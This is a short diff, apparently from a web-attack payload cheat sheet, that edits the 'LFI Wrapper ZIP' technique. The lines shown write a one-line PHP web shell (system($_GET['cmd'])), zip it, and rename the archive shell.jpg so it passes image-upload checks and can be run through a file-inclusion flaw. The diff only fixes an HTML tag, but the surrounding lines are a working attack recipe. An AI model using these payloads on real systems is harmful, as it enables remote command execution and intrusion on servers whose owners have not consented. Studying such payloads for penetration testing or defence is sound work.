@@ -72,7 +72,7 @@ http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encod
 
 LFI Wrapper ZIP
 ```python
-echo "</pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
 zip payload.zip payload.php;   
 mv payload.zip shell.jpg;    
 rm payload.php   
